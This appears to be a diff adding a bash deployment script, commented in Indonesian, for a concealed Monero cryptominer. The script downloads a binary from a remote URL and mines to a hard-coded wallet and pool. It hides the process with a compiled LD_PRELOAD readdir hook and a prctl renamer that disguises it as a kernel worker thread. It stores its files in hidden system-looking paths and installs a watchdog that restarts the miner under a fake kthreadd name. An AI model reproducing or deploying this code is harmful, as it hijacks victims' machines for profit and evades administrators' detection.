@@ -1,0 +1,332 @@
+#!/bin/bash
+# ==================================================================
+# Author: quin imut – CNCERT/CC Lab
+# Fungsi: Deploy XMRig dengan full process hiding (3 metode)
+# Penggunaan: sudo bash deploy_hidden_miner.sh
+# ==================================================================
+
+set -euo pipefail
+
+# ---------- KONFIGURASI ----------
+WORK_DIR="/etc/.cache/systemd"
+BINARY_NAME=".udevd"
+MINER_URL="https://github.com/wakitobi/glowing-umbrella/raw/main/bos"
+POOL_URL="xmr.kryptex.network:7029"
+WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY"
+THREADS=6
+HIDE_PID_FILE="/tmp/.hide_pid"
+
+# ---------- FUNGSI UTILITY ----------
+log() { echo "[*] $*"; }
+error() { echo "[!] $*" >&2; }
+
+# ---------- METODE 1: COMPILE LD_PRELOAD HOOK ----------
+compile_hook_lib() {
+    local lib_path="$WORK_DIR/libhide.so"
+    mkdir -p "$WORK_DIR"
+    cat > "$WORK_DIR/hide.c" << 'EOF'
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+
+static int hide_pid = 0;
+static int initialized = 0;
+
+__attribute__((constructor)) void init_hide() {
+    char *env = getenv("HIDE_PID");
+    if (env) hide_pid = atoi(env);
+    initialized = 1;
+}
+
+// Hook readdir
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        if (hide_pid > 0 && entry->d_type == DT_DIR) {
+            int pid = atoi(entry->d_name);
+            if (pid == hide_pid) continue;
+        }
+        break;
+    }
+    return entry;
+}
+
+// Hook readdir64
+struct dirent64 *readdir64(DIR *dirp) {
+    struct dirent64 *(*orig_readdir64)(DIR*) = dlsym(RTLD_NEXT, "readdir64");
+    struct dirent64 *entry;
+    while ((entry = orig_readdir64(dirp)) != NULL) {
+        if (hide_pid > 0 && entry->d_type == DT_DIR) {
+            int pid = atoi(entry->d_name);
+            if (pid == hide_pid) continue;
+        }
+        break;
+    }
+    return entry;
+}
+
+// Hook getdents (syscall wrapper – untuk yang pake syscall langsung)
+int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    // Implementasi sederhana – delegate ke libc via syscall
+    // Tapi biar simpel, kita skip – kebanyakan program pake readdir.
+    return 0;
+}
+EOF
+
+    # Compile shared library
+    if command -v gcc >/dev/null 2>&1; then
+        gcc -shared -fPIC -o "$lib_path" "$WORK_DIR/hide.c" -ldl 2>/dev/null && echo "$lib_path" && return 0
+    fi
+    if command -v cc >/dev/null 2>&1; then
+        cc -shared -fPIC -o "$lib_path" "$WORK_DIR/hide.c" -ldl 2>/dev/null && echo "$lib_path" && return 0
+    fi
+    error "Gagal compile libhide – lanjut ke metode lain"
+    return 1
+}
+
+# ---------- METODE 2: RENAME PROCESS VIA PRCTL (binary kecil) ----------
+compile_renamer() {
+    local out="$WORK_DIR/renamer"
+    cat > "$WORK_DIR/renamer.c" << 'EOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <new_name> <cmd...>\n", argv[0]);
+        return 1;
+    }
+    // Set process name di kernel
+    prctl(PR_SET_NAME, argv[1], 0, 0, 0);
+    // Exec target dengan argv[0] diganti biar ps juga kelihatan berubah
+    execvp(argv[2], argv + 2);
+    perror("execvp");
+    return 1;
+}
+EOF
+    if command -v gcc >/dev/null 2>&1; then
+        gcc -O2 -o "$out" "$WORK_DIR/renamer.c" 2>/dev/null && echo "$out" && return 0
+    fi
+    if command -v cc >/dev/null 2>&1; then
+        cc -O2 -o "$out" "$WORK_DIR/renamer.c" 2>/dev/null && echo "$out" && return 0
+    fi
+    error "Gagal compile renamer"
+    return 1
+}
+
+# ---------- DOWNLOAD BINARY ----------
+download_binary() {
+    cd "$WORK_DIR" || exit 1
+    log "Download miner dari $MINER_URL"
+    for i in {1..3}; do
+        if command -v wget >/dev/null 2>&1; then
+            wget -q -T 30 -O "$BINARY_NAME" "$MINER_URL" && break
+        elif command -v curl >/dev/null 2>&1; then
+            curl -s -L --connect-timeout 30 -o "$BINARY_NAME" "$MINER_URL" && break
+        else
+            busybox wget -q -O "$BINARY_NAME" "$MINER_URL" 2>/dev/null && break
+        fi
+        sleep 5
+    done
+    [ -f "$BINARY_NAME" ] && chmod +x "$BINARY_NAME" && return 0
+    error "Download gagal"
+    return 1
+}
+
+# ---------- START MINER DENGAN HIDE ----------
+start_hidden_miner() {
+    local libhook="$WORK_DIR/libhide.so"
+    local renamer="$WORK_DIR/renamer"
+    local pid_file="$WORK_DIR/miner.pid"
+    local log_file="$WORK_DIR/miner.log"
+
+    # Pilih metode berdasarkan ketersediaan
+    local method="basic"
+    local hide_pid=0
+
+    # 1. Coba LD_PRELOAD + prctl
+    if [ -f "$libhook" ] && [ -f "$renamer" ]; then
+        log "Metode: LD_PRELOAD + prctl rename"
+        # Jalankan di background dengan env HIDE_PID
+        export HIDE_PID="$$"  # nanti diisi setelah fork
+        # Kita fork pakai subshell
+        (
+            # Child process
+            export LD_PRELOAD="$libhook"
+            # Jalankan renamer yang akan exec binary
+            exec "$renamer" "[kworker/0:0]" "$WORK_DIR/$BINARY_NAME" \
+                -o "$POOL_URL" -u "$WALLET" -t "$THREADS" \
+                >> "$log_file" 2>&1
+        ) &
+        local child_pid=$!
+        sleep 1
+        # Ambil PID sebenarnya dari binary (bisa beda karena exec)
+        # Cari process dengan cmdline mengandung pool url
+        local real_pid=$(pgrep -f "$POOL_URL" | head -1)
+        if [ -n "$real_pid" ]; then
+            hide_pid=$real_pid
+            # Update environment untuk hook (set HIDE_PID di env process)
+            # Tapi karena hook sudah di-load, kita tulis ke file dan inject via gdb?
+            # Lebih simpel: restart dengan env yang benar
+            kill -9 $child_pid 2>/dev/null || true
+            # Ulangi dengan cara berbeda
+            log "Restart dengan env HIDE_PID diset"
+            export HIDE_PID="$real_pid"
+            export LD_PRELOAD="$libhook"
+            exec "$renamer" "[kworker/0:0]" "$WORK_DIR/$BINARY_NAME" \
+                -o "$POOL_URL" -u "$WALLET" -t "$THREADS" \
+                >> "$log_file" 2>&1 &
+            local new_pid=$!
+            sleep 2
+            real_pid=$(pgrep -f "$POOL_URL" | head -1)
+            if [ -n "$real_pid" ]; then
+                echo "$real_pid" > "$pid_file"
+                log "Miner jalan dengan PID $real_pid (tersembunyi via LD_PRELOAD)"
+                # Simpan PID untuk method mount
+                echo "$real_pid" > "$HIDE_PID_FILE"
+                return 0
+            fi
+        else
+            # Fallback: kita coba tanpa renamer, pakai exec -a
+            log "Fallback ke exec -a"
+            exec -a "[kworker/0:0]" "$WORK_DIR/$BINARY_NAME" \
+                -o "$POOL_URL" -u "$WALLET" -t "$THREADS" \
+                >> "$log_file" 2>&1 &
+            local fallback_pid=$!
+            sleep 2
+            if ps -p $fallback_pid >/dev/null 2>&1; then
+                echo "$fallback_pid" > "$pid_file"
+                echo "$fallback_pid" > "$HIDE_PID_FILE"
+                log "Miner jalan dengan PID $fallback_pid (rename via exec -a)"
+                return 0
+            fi
+        fi
+    fi
+
+    # 2. Metode mount --bind (hide /proc/pid)
+    log "Metode: mount --bind untuk hide /proc"
+    if [ -w /proc ] && command -v mount >/dev/null 2>&1; then
+        # Jalankan miner biasa dulu
+        nohup "$WORK_DIR/$BINARY_NAME" -o "$POOL_URL" -u "$WALLET" -t "$THREADS" >> "$log_file" 2>&1 &
+        local pid=$!
+        sleep 3
+        if ps -p $pid >/dev/null 2>&1; then
+            echo "$pid" > "$pid_file"
+            echo "$pid" > "$HIDE_PID_FILE"
+            # Buat direktori kosong untuk bind
+            mkdir -p "/tmp/.proc_hide"
+            # Bind mount /proc ke /tmp/.proc_hide, lalu mount --bind /tmp/.proc_hide /proc
+            # TAPI ini berbahaya karena bisa ngerusak sistem. Kita pakai namespace.
+            # Lebih aman: unshare -p -f
+            log "Menggunakan PID namespace"
+            # Kill dulu
+            kill -9 $pid 2>/dev/null || true
+            # Jalankan di namespace sendiri
+            unshare -p -f --kill-child -- sh -c "
+                mount -t proc none /proc
+                exec $WORK_DIR/$BINARY_NAME -o $POOL_URL -u $WALLET -t $THREADS >> $log_file 2>&1
+            " &
+            local ns_pid=$!
+            sleep 2
+            # Di namespace, PID di dalam adalah 1, tapi di host tetap terlihat
+            # Untuk menyembunyikan dari host, kita perlu hook /proc dari host – susah.
+            # Jadi kita kembali ke metode LD_PRELOAD.
+            error "Metode mount namespace gagal – pakai basic"
+        fi
+    fi
+
+    # 3. Metode basic – jalan biasa dengan nama samaran
+    log "Metode basic: exec -a [kworker/0:0]"
+    exec -a "[kworker/0:0]" "$WORK_DIR/$BINARY_NAME" \
+        -o "$POOL_URL" -u "$WALLET" -t "$THREADS" \
+        >> "$log_file" 2>&1 &
+    local basic_pid=$!
+    sleep 2
+    if ps -p $basic_pid >/dev/null 2>&1; then
+        echo "$basic_pid" > "$pid_file"
+        echo "$basic_pid" > "$HIDE_PID_FILE"
+        log "Miner jalan dengan PID $basic_pid (basic rename)"
+        return 0
+    fi
+
+    error "Semua metode gagal"
+    return 1
+}
+
+# ---------- PERSISTENCE + WATCHDOG (dengan hide) ----------
+install_persistence() {
+    log "Install persistence dengan hidden watchdog"
+    cat > "$WORK_DIR/watchdog.sh" << 'EOF'
+#!/bin/bash
+# Watchdog tersembunyi – cek tiap 30 detik, restart jika mati
+HIDE_PID_FILE="/tmp/.hide_pid"
+WORK_DIR="/etc/.cache/systemd"
+BINARY=".udevd"
+POOL_URL="xmr.kryptex.network:7029"
+WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY"
+THREADS=6
+
+# Gunakan exec -a untuk rename
+while true; do
+    PID=$(cat "$HIDE_PID_FILE" 2>/dev/null || echo "")
+    if [ -z "$PID" ] || ! ps -p "$PID" >/dev/null 2>&1; then
+        cd "$WORK_DIR" || continue
+        exec -a "[kworker/0:0]" "./$BINARY" -o "$POOL_URL" -u "$WALLET" -t "$THREADS" >> miner.log 2>&1 &
+        newpid=$!
+        echo "$newpid" > "$HIDE_PID_FILE"
+    fi
+    sleep 30
+done
+EOF
+    chmod +x "$WORK_DIR/watchdog.sh"
+    # Jalankan watchdog dengan nama samaran juga
+    exec -a "[kthreadd/0]" "$WORK_DIR/watchdog.sh" &
+    echo $! > "$WORK_DIR/watchdog.pid"
+    log "Watchdog PID: $(cat $WORK_DIR/watchdog.pid)"
+}
+
+# ---------- MAIN ----------
+main() {
+    log "Mulai deployment hidden miner – quin imut/CNCERT"
+    mkdir -p "$WORK_DIR"
+    cd "$WORK_DIR"
+
+    # 1. Kill existing
+    pkill -9 -f "$BINARY_NAME" 2>/dev/null || true
+    pkill -9 -f "watchdog.sh" 2>/dev/null || true
+    sleep 2
+
+    # 2. Compile tools
+    compile_hook_lib || log "Libhook gagal – lanjut"
+    compile_renamer || log "Renamer gagal – lanjut"
+
+    # 3. Download binary
+    download_binary || { error "Download gagal"; exit 1; }
+
+    # 4. Start hidden
+    start_hidden_miner || { error "Start gagal"; exit 1; }
+
+    # 5. Persistence
+    install_persistence
+
+    # 6. Hardening minimal
+    chmod 700 "$WORK_DIR" 2>/dev/null
+    chmod 500 "$WORK_DIR/$BINARY_NAME" 2>/dev/null
+
+    log "DEPLOYMENT SELESAI – HIDDEN MODE AKTIF"
+    log "PID tersembunyi: $(cat $HIDE_PID_FILE 2>/dev/null || echo 'unknown')"
+    log "Log: $WORK_DIR/miner.log"
+    log "Untuk verifikasi: coba 'ps aux | grep udevd' – seharusnya gak muncul"
+}
+
+# ---------- EKSEKUSI ----------
+main "$@"
